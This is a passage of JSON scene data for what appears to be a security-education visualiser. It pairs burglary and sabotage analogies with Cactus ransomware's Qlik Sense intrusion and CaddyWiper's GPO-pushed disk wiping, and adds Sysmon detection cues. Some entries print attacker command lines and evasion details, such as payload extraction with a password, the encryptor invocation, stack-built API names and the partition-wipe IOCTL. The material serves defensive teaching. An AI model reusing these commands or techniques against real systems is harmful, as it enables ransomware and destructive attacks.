      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Cactus Ransomware: Qlik Sense Exploitation (CVE-2023-41265), Chisel SSH… — Story-to-Technical Overview",
      "storyCue": "Imagine a stealthy burglar who sneaks through a warped side tunnel inside an analytics server and bolts a permanent hidden skylight onto the building schedule so they can return anytime. Rather than carrying an exposed lockpicker that guards immediately recognize, the burglar drops a password-locked suitcase onto every desk, unpacks a scrambled inner box using a secret key at runtime, and marks each file twice (first with an in-progress tag while taking tiny sips of data, then with a finished lock tag once sealed).",
      "technicalCue": "INITIAL ACCESS: Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task -> DEFENSE EVASION: PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`) -> EXFIL & IMPACT: Multi-Stream Micro-Read Encryption (`.cts0` -> `.cts1`) & `cAcTuS.readme.txt`",
      "storyMappings": [
        {
          "storyTerm": "Warped side tunnel and permanent hidden skylight on the schedule",
          "technicalTerm": "Qlik Sense CVE-2023-41265 tunneling RCE and persistent OpenSSH scheduled task",
          "tone": "amber"
        },
        {
          "storyTerm": "Password-locked suitcase unpacking a scrambled inner box at runtime",
          "technicalTerm": "7z.exe archive extraction and self-decrypting Cactus binary via -i AES key",
          "tone": "sky"
        },
        {
          "storyTerm": "Marking each file in-progress then finished while taking tiny sips",
          "technicalTerm": "Multi-stream micro-read encryption renaming files from .cts0 to .cts1",
          "tone": "rose"
        },
        {
          "storyTerm": "Extortion letter dropped across sealed rooms",
          "technicalTerm": "cAcTuS.readme.txt ransom note generated after completion",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-cactus-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Warped side tunnel and permanent hidden…",
          "subtitle": "Qlik Sense CVE-2023-41265 tunneling RCE and persistent OpenSSH…",
          "tone": "amber"
        },
        {
          "id": "ran-cactus-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Password-locked suitcase unpacking a…",
          "subtitle": "7z.exe archive extraction and self-decrypting Cactus binary…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bent",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task",
          "storyExcerpt": "Exploiting a bent routing tunnel inside a public analytics portal, the burglar slips straight into the back office and wires a repeating scheduled task that keeps a private encrypted back door propped…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe -> cmd.exe /c powershell.exe -enc ... (which invokes the Windows PowerShell host , powershell.exe with…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Fool Who",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`)",
          "storyExcerpt": "To fool hallway security inspectors who X-ray every file sitting on disk, the crew sprays a locked archive across every workstation, unzips it with a batch script, and passes an unlocking key directly on…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\7z.exe x C:\\ProgramData\\pack.7z -p\"Cactus2026!\" -oC:\\ProgramData\\ -y (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Sips So",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Multi-Stream Micro-Read Encryption (`.cts0` -> `.cts1`) & `cAcTuS.readme.txt`",
          "storyExcerpt": "Running in quiet multi-stream mode, the unscrambled encryptor takes small sips of each file so heavy disk-thrashing alarms stay calm, tagging active files with a temporary work badge before flipping them…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\cactus.exe -r (Renames file -> *.cts0 during AES/RSA encryption -> *.cts1 on completion) (which executes the technical command / telemetry…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Side Tunnel",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Case",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Unpack Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "cactus-ransomware-qlik-sense-ssh-batch-unpacker",
      "sectionKey": "step-1",
      "sceneKind": "ran-cactus-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task",
      "storyCue": "Exploiting a bent routing tunnel inside a public analytics portal, the burglar slips straight into the back office and wires a repeating scheduled task that keeps a private encrypted back door propped open outward toward their own server.",
      "technicalCue": "T1190 · INITIAL ACCESS — Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (CVE-2023-41265 and CVE-2023-41266), causing scheduler.exe to spawn cmd.exe and powershell.exe.",
      "storyMappings": [
        {
          "storyTerm": "Bent routing tunnel inside an analytics portal",
          "technicalTerm": "Qlik Sense Enterprise HTTP request tunneling and path traversal (CVE-2023-41265)",
          "tone": "amber"
        },
        {
          "storyTerm": "Repeating scheduled task holding a skylight open",
          "technicalTerm": "Scheduled task maintaining a persistent reverse OpenSSH tunnel",
          "tone": "sky"
        },
        {
          "storyTerm": "Bypassing inbound perimeter doors",
          "technicalTerm": "Outbound SSH reverse tunnel surviving perimeter IP blocks",
          "tone": "rose"
        },
        {
          "storyTerm": "Staging ground for enterprise spread",
          "technicalTerm": "Compromised analytics server used to pivot into Active Directory",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cactus-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Bent routing tunnel inside an analytics…",
          "subtitle": "Qlik Sense Enterprise HTTP request tunneling and path…",
          "tone": "amber"
        },
        {
          "id": "ran-cactus-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Repeating scheduled task holding a…",
          "subtitle": "Scheduled task maintaining a persistent reverse OpenSSH tunnel",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bent",
          "stageTag": "STEP 01 · SETUP",
          "title": "Bent routing tunnel inside an analytics portal",
          "storyExcerpt": "Exploiting a bent routing tunnel inside a public analytics portal, the burglar slips straight into the back office and wires a repeating scheduled task that keeps a private encrypted back door…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe -> cmd.exe /c powershell.exe -enc ... (which invokes the Windows PowerShell host , powershell.exe with…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Task Open",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Repeating scheduled task holding a skylight open",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses repeating scheduled task holding a skylight open to advance toward bypassing inbound perimeter doors.",
          "technicalParallel": "Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (CVE-2023-41265 and CVE-2023-41266), causing scheduler.exe to spawn cmd.exe and powershell.exe.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bent Back",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Staging ground for enterprise spread",
          "storyExcerpt": "Behind the scenes, staging ground for enterprise spread captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording ExploitedService=Qlik Sense Scheduler , scheduler.exe, VulnerabilityIds=CVE-2023-41265 & CVE-2023-41266, PersistenceTask=Scheduled Task \"Updates\" running reverse…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Side Tunnel",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Case",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Unpack Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "cactus-ransomware-qlik-sense-ssh-batch-unpacker",
      "sectionKey": "step-2",
      "sceneKind": "ran-cactus-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "PsExec Batch Staging, 7z.exe Extraction & -i AES Key Self-Decryption (ntuser.dat)",
      "storyCue": "To fool hallway security inspectors who X-ray every file sitting on disk, the crew sprays a locked archive across every workstation, unzips it with a batch script, and passes an unlocking key directly on the command line so the padlocking machine only unscrambles itself inside live working memory.",
      "technicalCue": "T1140 · DEFENSE EVASION — Using a custom PowerShell sprayer (s.ps1) and psexec.exe, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with 7z.exe, deletes the archive, and launches the…",
      "storyMappings": [
        {
          "storyTerm": "Spraying a locked archive across every workstation",
          "technicalTerm": "PowerShell sprayer (s.ps1) and PsExec distributing a password-protected 7-Zip archive",
          "tone": "amber"
        },
        {
          "storyTerm": "Unzipping with a batch helper script",
          "technicalTerm": "7z.exe extracting the encrypted Cactus payload (ntuser.dat) on target hosts",
          "tone": "sky"
        },
        {
          "storyTerm": "Unlocking key passed on the command line",
          "technicalTerm": "Mandatory -i flag supplying the AES key for runtime self-decryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Defeating static X-ray inspection on disk",
          "technicalTerm": "Encrypted on-disk payload remaining unreadable to static AV signatures until -i runs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cactus-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Spraying a locked archive across every…",
          "subtitle": "PowerShell sprayer (s.ps1) and PsExec distributing a…",
          "tone": "amber"
        },
        {
          "id": "ran-cactus-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Unzipping with a batch helper script",
          "subtitle": "7z.exe extracting the encrypted Cactus payload (ntuser.dat) on…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Fool Who",
          "stageTag": "STEP 02 · SETUP",
          "title": "Spraying a locked archive across every workstation",
          "storyExcerpt": "To fool hallway security inspectors who X-ray every file sitting on disk, the crew sprays a locked archive across every workstation, unzips it with a batch script, and passes an unlocking key…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\7z.exe x C:\\ProgramData\\pack.7z -p\"Cactus2026!\" -oC:\\ProgramData\\ -y (which executes the technical command / telemetry directive…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Key",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Unzipping with a batch helper script",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses unzipping with a batch helper script to advance toward unlocking key passed on the command line.",
          "technicalParallel": "Using a custom PowerShell sprayer (s.ps1) and psexec.exe, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with 7z.exe, deletes the archive, and launches the Cactus…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Key Line",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Defeating static X-ray inspection on disk",
          "storyExcerpt": "Behind the scenes, defeating static x-ray inspection on disk captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording AntiAnalysisMechanism=Requires -i 32-byte hex AES key to decrypt C:\\ProgramData\\ntuser.dat, ExecutionStages=-s , setup -> -i , decrypt ntuser.dat -> -r , runtime…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Side Tunnel",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Case",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Unpack Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1140"
    },
    "step-3": {
      "scenarioId": "cactus-ransomware-qlik-sense-ssh-batch-unpacker",
      "sectionKey": "step-3",
      "sceneKind": "ran-cactus-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Multi-Stream Micro-Read Encryption (.cts0 -> .cts1) & cAcTuS.readme.txt",
      "storyCue": "Running in quiet multi-stream mode, the unscrambled encryptor takes small sips of each file so heavy disk-thrashing alarms stay calm, tagging active files with a temporary work badge before flipping them to a final sealed tag and leaving its signature cactus ransom card.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Running under the -r flag, Cactus renames target files to .cts0 while actively encrypting them in small micro-streams (preventing file-lock race conditions) and renames them to .cts1 upon…",
      "storyMappings": [
        {
          "storyTerm": "Taking small sips so disk-thrashing alarms stay calm",
          "technicalTerm": "Multi-stream micro-read encryption under the -r flag evading I/O spike heuristics",
          "tone": "amber"
        },
        {
          "storyTerm": "Temporary work badge during active locking",
          "technicalTerm": "Target files temporarily renamed to .cts0 while encryption is underway",
          "tone": "sky"
        },
        {
          "storyTerm": "Final sealed tag upon completion",
          "technicalTerm": "Completed encrypted files renamed from .cts0 to .cts1",
          "tone": "rose"
        },
        {
          "storyTerm": "Signature cactus ransom card",
          "technicalTerm": "Dropped cAcTuS.readme.txt extortion demand file",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cactus-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Taking small sips so disk-thrashing…",
          "subtitle": "Multi-stream micro-read encryption under the -r flag evading…",
          "tone": "amber"
        },
        {
          "id": "ran-cactus-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Temporary work badge during active locking",
          "subtitle": "Target files temporarily renamed to .cts0 while encryption is…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Sips So",
          "stageTag": "STEP 03 · SETUP",
          "title": "Taking small sips so disk-thrashing alarms stay calm",
          "storyExcerpt": "Running in quiet multi-stream mode, the unscrambled encryptor takes small sips of each file so heavy disk-thrashing alarms stay calm, tagging active files with a temporary work badge before…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\cactus.exe -r (Renames file -> *.cts0 during AES/RSA encryption -> *.cts1 on completion) (which executes the technical command / telemetry…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Work",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Temporary work badge during active locking",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses temporary work badge during active locking to advance toward final sealed tag upon completion.",
          "technicalParallel": "Running under the -r flag, Cactus renames target files to .cts0 while actively encrypting them in small micro-streams (preventing file-lock race conditions) and renames them to .cts1 upon completion…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tag Upon",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Signature cactus ransom card",
          "storyExcerpt": "Behind the scenes, signature cactus ransom card captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=Cactus Ransomware, TwoPhaseExtension=.cts0 , active stream -> .cts1 , completed, RansomNote=cAcTuS.readme.txt under T1486): Configure EDR…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Side Tunnel",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Case",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Unpack Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "caddywiper-arguepatch-gpo-destruction": {
    "briefing": {
      "scenarioId": "caddywiper-arguepatch-gpo-destruction",
      "sectionKey": "briefing",
      "sceneKind": "ran-caddywiper-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1053.005",
      "title": "Sandworm ArguePatch Loader & CaddyWiper Domain-Aware Disk Wiper… — Story-to-Technical Overview",
      "storyCue": "Imagine a cunning saboteur operating inside a company headquarters who deliberately spares the central dispatch tower itself so the tower stays alive long enough to broadcast destruction orders to every branch office. Using a disguised repair-tool wrapper pushed from the central policy board, the wiper checks whether each machine is the dispatch tower first; on every regular office computer, it seizes ownership of every user drawer, scrubs every document to blank zeros, and erases the floor plan of every hard drive.",
      "technicalCue": "EXECUTION: GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution -> CREDENTIAL ACCESS: DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers -> EXFIL & IMPACT: TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe",
      "storyMappings": [
        {
          "storyTerm": "Disguised repair-tool wrapper pushed from the central policy board",
          "technicalTerm": "Active Directory GPO pushing ArguePatch patched IDA debugger loader from SYSVOL",
          "tone": "amber"
        },
        {
          "storyTerm": "Checking whether each machine is the dispatch tower so it stays alive",
          "technicalTerm": "DsRoleGetPrimaryDomainInformation check sparing Primary Domain Controllers",
          "tone": "sky"
        },
        {
          "storyTerm": "Seizing ownership of every drawer and scrubbing documents to blank zeros",
          "technicalTerm": "SeTakeOwnershipPrivilege recursive C:\\Users file zeroing via SetNamedSecurityInfoA",
          "tone": "rose"
        },
        {
          "storyTerm": "Erasing the floor plan of every hard drive",
          "technicalTerm": "Raw partition table wipe via IOCTL_DISK_SET_DRIVE_LAYOUT_EX (0x0007C054)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#FACC15",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-caddywiper-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Disguised repair-tool wrapper pushed…",
          "subtitle": "Active Directory GPO pushing ArguePatch patched IDA debugger…",
          "tone": "amber"
        },
        {
          "id": "ran-caddywiper-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Checking whether each machine is the…",
          "subtitle": "DsRoleGetPrimaryDomainInformation check sparing Primary Domain…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. It Out",
          "stageTag": "STAGE 01 · EXECUTION",
          "title": "GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution",
          "storyExcerpt": "Standing inside the central dispatch tower, the saboteur takes a genuinely known software debugger, surgically splices a hidden trigger into its opening routine, and pushes it out across the entire…",
          "technicalParallel": "Sandworm reused the exact same ArguePatch loader weeks later during the April 2022 electrical substation attack (Industroyer2) to schedule timed destruction of Windows servers.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Each So",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers",
          "storyExcerpt": "Assembling its own command labels secretly piece by piece so casual code scanners read nothing suspicious, the wiper very first action is checking the room nameplate: if it realizes it is standing inside…",
          "technicalParallel": "This execution guardrail explains why responders during a CaddyWiper incident often found member workstations and application servers completely bricked while the Primary Domain Controller remained up…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Desk",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe",
          "storyExcerpt": "On every ordinary workstation and branch server, the wiper claims legal ownership of every locked desk drawer, overwrites every personal file with blank zeros from top to bottom, and sends a single raw…",
          "technicalParallel": "By abusing the legitimate Windows kernel disk IOCTL IOCTL_DISK_SET_DRIVE_LAYOUT_EX (0x0007C054) rather than bringing a third-party kernel driver, CaddyWiper destroyed the disk partition table without…",
          "accentHex": "#FACC15",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Tower",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wiped Drives",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Broadcast Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "caddywiper-arguepatch-gpo-destruction",
      "sectionKey": "step-1",
      "sceneKind": "ran-caddywiper-step-1",
      "stageBadge": "STEP #1 · EXECUTION",
      "title": "GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution",
      "storyCue": "Standing inside the central dispatch tower, the saboteur takes a genuinely known software debugger, surgically splices a hidden trigger into its opening routine, and pushes it out across the entire company through the official morning policy board.",
      "technicalCue": "T1053.005 · EXECUTION — From a compromised Domain Controller, Sandworm staged payloads in SYSVOL and pushed an Active Directory Group Policy Scheduled Task to execute CaddyWiper either directly (caddy.exe) or wrapped…",
      "storyMappings": [
        {
          "storyTerm": "Central dispatch tower policy board",
          "technicalTerm": "Compromised Domain Controller SYSVOL share and Group Policy Object (GPO) push",
          "tone": "amber"
        },
        {
          "storyTerm": "Surgically altered known software debugger",
          "technicalTerm": "ArguePatch trojanized legitimate IDA Pro debugger binary (win32_remote.exe)",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden trigger spliced into the opening routine",
          "technicalTerm": "Patched entry point decrypting and launching the CaddyWiper shellcode payload",
          "tone": "rose"
        },
        {
          "storyTerm": "Company-wide synchronized deployment",
          "technicalTerm": "Scheduled task created across all domain-joined workstations and member servers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-caddywiper-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Central dispatch tower policy board",
          "subtitle": "Compromised Domain Controller SYSVOL share and Group Policy…",
          "tone": "amber"
        },
        {
          "id": "ran-caddywiper-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Surgically altered known software debugger",
          "subtitle": "ArguePatch trojanized legitimate IDA Pro debugger binary…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. It Out",
          "stageTag": "STEP 01 · SETUP",
          "title": "Central dispatch tower policy board",
          "storyExcerpt": "Standing inside the central dispatch tower, the saboteur takes a genuinely known software debugger, surgically splices a hidden trigger into its opening routine, and pushes it out across the…",
          "technicalParallel": "Sandworm reused the exact same ArguePatch loader weeks later during the April 2022 electrical substation attack (Industroyer2) to schedule timed destruction of Windows servers.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Surgically altered known software debugger",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses surgically altered known software debugger to advance toward hidden trigger spliced into the opening routine.",
          "technicalParallel": "From a compromised Domain Controller, Sandworm staged payloads in SYSVOL and pushed an Active Directory Group Policy Scheduled Task to execute CaddyWiper either directly (caddy.exe) or wrapped inside…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. It Out",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Company-wide synchronized deployment",
          "storyExcerpt": "Behind the scenes, company-wide synchronized deployment captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Sysmon EventID 1 for win32_remote.exe or caddy.exe spawned by the Task Scheduler (svchost.exe -k netsvcs -p -s Schedule) from C:\\Users\\Public or SYSVOL.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Tower",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wiped Drives",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Broadcast Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1053.005"
    },
    "step-2": {
      "scenarioId": "caddywiper-arguepatch-gpo-destruction",
      "sectionKey": "step-2",
      "sceneKind": "ran-caddywiper-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers",
      "storyCue": "Assembling its own command labels secretly piece by piece so casual code scanners read nothing suspicious, the wiper very first action is checking the room nameplate: if it realizes it is standing inside the central dispatch tower, it immediately steps back so the tower stays online to keep wrecking every other room.",
      "technicalCue": "T1082 · CREDENTIAL ACCESS — Resolving API names dynamically on the stack to hide its Import Address Table (IAT), CaddyWiper’s very first action was calling DsRoleGetPrimaryDomainInformation(NULL…",
      "storyMappings": [
        {
          "storyTerm": "Assembling command labels piece by piece in private",
          "technicalTerm": "Stack-constructed API strings hiding imports from the PE Import Address Table (IAT)",
          "tone": "amber"
        },
        {
          "storyTerm": "Checking the room nameplate first",
          "technicalTerm": "Calling DsRoleGetPrimaryDomainInformation to inspect machine domain role",
          "tone": "sky"
        },
        {
          "storyTerm": "Stepping back when standing inside the central dispatch tower",
          "technicalTerm": "Exiting immediately if role equals DsRole_RolePrimaryDomainController",
          "tone": "rose"
        },
        {
          "storyTerm": "Keeping the dispatch tower alive to spread destruction",
          "technicalTerm": "Preserving Active Directory GPO replication while wiping all member endpoints",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-caddywiper-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Assembling command labels piece by piece…",
          "subtitle": "Stack-constructed API strings hiding imports from the PE…",
          "tone": "amber"
        },
        {
          "id": "ran-caddywiper-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Checking the room nameplate first",
          "subtitle": "Calling DsRoleGetPrimaryDomainInformation to inspect machine…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Own So",
          "stageTag": "STEP 02 · SETUP",
          "title": "Assembling command labels piece by piece in private",
          "storyExcerpt": "Assembling its own command labels secretly piece by piece so casual code scanners read nothing suspicious, the wiper very first action is checking the room nameplate: if it realizes it is…",
          "technicalParallel": "This execution guardrail explains why responders during a CaddyWiper incident often found member workstations and application servers completely bricked while the Primary Domain Controller remained up…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Room",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Checking the room nameplate first",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses checking the room nameplate first to advance toward stepping back when standing inside the central dispatch tower.",
          "technicalParallel": "Resolving API names dynamically on the stack to hide its Import Address Table (IAT), CaddyWiper’s very first action was calling DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic…",
          "accentHex": "#F59E0B",
